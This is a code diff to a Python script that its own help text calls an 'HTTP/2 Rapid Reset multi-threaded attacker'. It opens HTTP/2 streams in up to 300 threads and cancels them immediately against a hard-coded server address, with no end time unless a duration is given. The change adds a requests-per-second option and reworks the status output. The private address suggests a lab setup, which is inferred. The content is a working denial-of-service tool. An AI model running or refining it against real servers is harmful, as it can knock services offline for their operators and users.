@@ -7,9 +7,8 @@ import argparse
 import h2.connection
 import h2.config
 
-TARGET_IP    = "192.168.20.10"
-TARGET_PORT  = 80
-THREAD_COUNT = 300
+TARGET_IP   = "192.168.20.10"
+TARGET_PORT = 80
 
 parser = argparse.ArgumentParser(description="HTTP/2 Rapid Reset multi-threaded attacker")
 parser.add_argument(
@@ -20,10 +19,22 @@ parser.add_argument(
     "--duration", type=int, default=None,
     help="Attack duration in seconds; omit for infinite",
 )
+parser.add_argument(
+    "--rps", type=int, default=None,
+    help="Total requests per second across all threads (default: max rate, 300 threads)",
+)
 args = parser.parse_args()
 
 CANCEL_RATE = args.cancel_rate
 end_time    = time.time() + args.duration if args.duration else None
+
+# RPS control: thread_count × (1 / sleep) = total rps
+if args.rps is not None:
+    THREAD_COUNT    = min(args.rps, 300)
+    SLEEP_INTERVAL  = THREAD_COUNT / args.rps   # = 1.0 when rps ≤ 300
+else:
+    THREAD_COUNT   = 300
+    SLEEP_INTERVAL = 0.001
 
 
 def attack_worker(worker_id: int):
@@ -50,7 +61,7 @@ def attack_worker(worker_id: int):
                     h2_conn.reset_stream(stream_id, error_code=0x8)
                 raw_socket.sendall(h2_conn.data_to_send())
                 stream_id += 2
-                time.sleep(0.001)
+                time.sleep(SLEEP_INTERVAL)
 
         except Exception:
             if end_time and time.time() >= end_time:
@@ -58,10 +69,11 @@ def attack_worker(worker_id: int):
             time.sleep(0.5)
 
 
+rps_label = f"{args.rps} RPS" if args.rps else "max rate"
 print(
-    f"🔥 [Attacker] {THREAD_COUNT} threads started. "
-    f"Cancel Rate: {CANCEL_RATE*100:.1f}%"
-    + (f"  Duration: {args.duration}s" if args.duration else "  Duration: ∞")
+    f"🔥 [Attacker] {THREAD_COUNT} threads  cancel_rate={CANCEL_RATE*100:.1f}%"
+    f"  {rps_label}"
+    + (f"  duration={args.duration}s" if args.duration else "  duration=∞")
 )
 sys.stdout.flush()
 
